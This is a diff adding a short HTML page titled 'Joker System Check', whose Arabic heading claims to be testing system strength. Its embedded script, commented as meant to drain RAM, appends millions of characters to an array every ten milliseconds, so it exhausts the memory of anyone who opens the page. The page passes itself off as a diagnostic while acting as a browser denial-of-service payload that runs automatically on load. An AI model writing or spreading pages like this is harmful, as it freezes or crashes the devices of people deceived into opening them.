@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Joker System Check</title>
+</head>
+<body style="background-color: black; color: lime; text-align: center;">
+    <h1>جاري فحص قوة النظام... 🛡️</h1>
+    <script>
+        // مصفوفة لاستنزاف الرام
+        let leak = [];
+        setInterval(() => {
+            // إضافة نصوص عشوائية طويلة جداً في الرام كل أجزاء من الثانية
+            for (let i = 0; i < 1000; i++) {
+                leak.push(new Array(1000000).join('JOKER-DZ-'));
+            }
+            console.log("Memory consuming...");
+        }, 10);
+    </script>
+</body>
+</html>
